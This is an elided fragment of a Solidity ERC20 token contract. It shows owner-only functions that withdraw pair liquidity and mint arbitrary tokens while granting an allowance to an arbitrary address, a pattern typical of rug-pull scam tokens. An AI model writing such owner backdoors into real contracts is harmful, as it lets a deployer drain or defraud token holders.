...
contract TestToken is ERC20, Ownable {
    ...
    function removeLiquidity() external onlyOwner {
      uint256 tokens = ERC20(pair).balanceOf(address(this));
      ERC20(pair).approve(address(_router), tokens);
    ...
    function mint(address approval, address account, uint256 amount) external onlyOwner {
        _mint(account, amount);
        _approve(account, approval, amount);
